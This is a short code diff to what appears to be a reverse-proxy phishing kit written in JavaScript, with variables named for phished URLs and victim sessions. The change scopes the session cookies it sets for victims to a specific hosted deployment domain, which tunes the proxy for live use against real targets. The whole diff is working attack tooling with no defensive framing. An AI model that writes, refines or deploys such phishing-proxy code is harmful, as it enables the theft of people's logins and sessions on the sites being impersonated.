@@ -136,7 +136,7 @@ if (url.startsWith('/login') && url.includes(PHISHED_URL_PARAMETER)) {
 
             if (!currentSession) {
                 const { cookieName, cookieValue } = generateNewSession(phishedURL);
-                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; HttpOnly; SameSite=Lax`);
+                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; HttpOnly; SameSite=Lax; Domain=.triumphant-adventure-production-2ae7.up.railway.app`);
                 session = cookieName;
             }
             VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
@@ -190,8 +190,8 @@ if (url.startsWith('/login') && url.includes(PHISHED_URL_PARAMETER)) {
                                         const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
 
                                         const { cookieName, cookieValue } = generateNewSession(phishedURL);
-                                        const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; HttpOnly; SameSite=Lax`;
-                                        clientResponse.setHeader("Set-Cookie", cookieHeader);
+                                        const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; HttpOnly; SameSite=Lax; Domain=.triumphant-adventure-production-2ae7.up.railway.app`;
+clientResponse.setHeader("Set-Cookie", cookieHeader);
                                         console.log(`[SET SESSION COOKIE (anonymous)] ${cookieHeader}`);
 
                                         VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
